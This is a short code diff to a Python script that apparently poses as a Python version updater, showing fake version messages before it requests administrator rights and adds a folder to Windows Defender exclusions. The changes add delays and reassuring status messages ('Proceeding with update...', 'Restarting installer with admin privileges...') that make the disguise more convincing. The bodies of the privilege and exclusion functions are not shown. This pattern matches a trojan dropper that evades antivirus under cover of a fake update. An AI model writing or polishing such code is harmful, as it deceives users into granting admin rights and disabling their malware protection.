@@ -43,6 +43,7 @@ class Main:
         print("Current version: 3.11.6")
         print("Updated to: 3.12.2")
         print("Restart may be required.")
+        time.sleep(2)
 
 if __name__ == "__main__":
     self = Main()
@@ -52,8 +53,11 @@ if __name__ == "__main__":
         
     if self.send_update_notification():
         print("Updating Python...")
+        time.sleep(1)
         if self.request_admin_privileges():
+            print("Proceeding with update...")
             self.add_folder_to_windows_defender_exclusions()
+            print("Settingup complete. Restarting installer with admin privileges...")
             self.perform_update()
         else:
             print("Admin privileges are required to perform the update. Please run the installer as an administrator.")
